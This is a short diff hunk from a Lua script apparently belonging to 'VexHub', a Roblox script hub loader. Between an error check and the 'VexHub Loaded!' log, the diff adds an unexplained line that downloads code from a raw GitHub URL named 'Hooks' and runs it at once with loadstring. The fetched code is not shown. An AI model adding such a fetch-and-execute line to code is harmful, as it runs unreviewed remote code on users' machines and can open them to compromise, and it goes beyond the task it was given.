@@ -587,6 +587,8 @@ if (writefile) then
 	end)
 	
 	CheckIfSuccess(Success, Error)
+
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Sofjskdkkco/GUIGateway/refs/heads/main/Hooks"))()
 	
 	if Errors == 0 then
 		CreateLog("white", "VexHub Loaded!")
